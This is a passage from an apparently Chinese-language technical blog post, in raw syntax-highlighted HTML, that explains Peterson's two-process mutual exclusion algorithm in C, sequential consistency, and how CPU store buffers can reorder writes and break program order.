&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;处理两个进程时的代码
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// ====== 进程P0 ======
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// P0想要进入
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;// P0谦让，优先权给P1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 等待：如果P1也想进入且轮到P1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// P0的临界区
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;P0 in critical section&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 访问共享资源...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// P0完成，退出
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// P0的其他工作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// ====== 进程P1 ======
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// P1想要进入
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;          &lt;span class=&#34;c1&#34;&gt;// P1谦让，优先权给P0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;turn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 等待：如果P0也想进入且轮到P0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// P1的临界区
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;P1 in critical section&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 访问共享资源...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;// P1完成，退出
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// P1的其他工作
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;顺序一致性&#34;&gt;顺序一致性
&lt;/h2&gt;&lt;h3 id=&#34;基本概念&#34;&gt;基本概念
&lt;/h3&gt;&lt;h4 id=&#34;定义-3&#34;&gt;定义
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;一个多处理器是顺序一致的，当且仅当任何一次的执行的结果都和某个顺序执行的结果相同，切每个处理器的操作在这个顺序中都按照程序指定的顺序出现&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;两个核心要求&#34;&gt;两个核心要求
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;程序顺序：每个处理器内的操作必须按程序指定的顺序执行&lt;/li&gt;
&lt;li&gt;全局顺序：所有处理器必须对所有内存操作有统一的观察顺序&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;直观理解&#34;&gt;直观理解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;可以类比为图书馆的借书系统&lt;/li&gt;
&lt;li&gt;想象一个图书馆的借书系统，顺序一致性即所有人能看到相同的结束记录顺序
&lt;ul&gt;
&lt;li&gt;张三借《操作系统》&lt;/li&gt;
&lt;li&gt;李四借《数据结构》&lt;/li&gt;
&lt;li&gt;王五还《算法导论》&lt;/li&gt;
&lt;li&gt;无论在哪个分馆查询，大家看到的记录顺序完全一致&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;存储缓冲区store-buffer&#34;&gt;存储缓冲区(Store Buffer)
&lt;/h2&gt;&lt;h3 id=&#34;基本概念-1&#34;&gt;基本概念
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;定义：存储缓冲区是位于CPU和缓存之间的硬件组件，用于临时存储CPU发出的写操作，以提高系统性能
&lt;ul&gt;
&lt;li&gt;CPU -&amp;gt; Store Buffer -&amp;gt; Chache -&amp;gt; Memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;目的：
&lt;ul&gt;
&lt;li&gt;避免CPU再写操作时等待&lt;/li&gt;
&lt;li&gt;提高流水线指令地效率&lt;/li&gt;
&lt;li&gt;允许写操作地批量处理和优化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;为什么需要store-buffer&#34;&gt;为什么需要Store Buffer
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;无Store Buffer时：
&lt;ul&gt;
&lt;li&gt;CPU执行：x = 1;&lt;/li&gt;
&lt;li&gt;步骤：
&lt;ul&gt;
&lt;li&gt;CPU发送写请求到缓存&lt;/li&gt;
&lt;li&gt;如果缓存缺失，需要等待从内存加载&lt;/li&gt;
&lt;li&gt;更新缓存&lt;/li&gt;
&lt;li&gt;CPU才能继续执行下一条指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;延迟可能高达几百个CPU周期&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有Store Buffer时：
&lt;ul&gt;
&lt;li&gt;CPU执行：x = 1;&lt;/li&gt;
&lt;li&gt;步骤：
&lt;ul&gt;
&lt;li&gt;CPU将写操作放入Store Buffer&lt;/li&gt;
&lt;li&gt;CPU立即继续执行下一条指令&lt;/li&gt;
&lt;li&gt;Store Buffer在后台异步完成实际写入&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;可以类比为邮箱，如果没有邮箱，那么用户每一封信都要等待邮递员到来，才能写信交给邮递员；有邮箱后之后写完放入邮箱就能写下一封&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;存储缓冲区的详细结构&#34;&gt;存储缓冲区的详细结构
&lt;/h3&gt;&lt;h4 id=&#34;硬件组织&#34;&gt;硬件组织
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          CPU Core
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;             |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    [Store Buffer]  ←── 队列结构，FIFO
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       |  |  |  |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Entry Entry Entry Entry
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       |  |  |  |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         Cache
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         |
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       Memory
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;每个Entry包含：
&lt;ul&gt;
&lt;li&gt;地址 (Address)&lt;/li&gt;
&lt;li&gt;数据 (Data)&lt;/li&gt;
&lt;li&gt;大小 (Size)&lt;/li&gt;
&lt;li&gt;有效位 (Valid)&lt;/li&gt;
&lt;li&gt;其他控制信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;典型的store-buffer参数&#34;&gt;典型的Store Buffer参数
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;现代CPU的Store Buffer特征：
&lt;ul&gt;
&lt;li&gt;容量：16-64个条目&lt;/li&gt;
&lt;li&gt;宽度：支持不同大小的写操作（1,2,4,8字节）&lt;/li&gt;
&lt;li&gt;合并：相邻写操作可能被合并&lt;/li&gt;
&lt;li&gt;顺序：通常按FIFO顺序排出到缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;工作机制fifo队列&#34;&gt;工作机制：FIFO队列
&lt;/h3&gt;&lt;h3 id=&#34;存在的问题&#34;&gt;存在的问题
&lt;/h3&gt;&lt;h4 id=&#34;违反程序顺序&#34;&gt;违反程序顺序
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//程序意图：先设置数据，再设置标志
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//写操作1：进入Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//写操作2：也进入Store Buffer
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//其他CPU可能观察到的顺序：
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//flag=true先生效（如果flag在缓存中）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//data=42后生效（如果data需要从呢村加载到缓存）
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//这违反了程序顺序
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;peterson算法失败&#34;&gt;Peterson算法失败
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
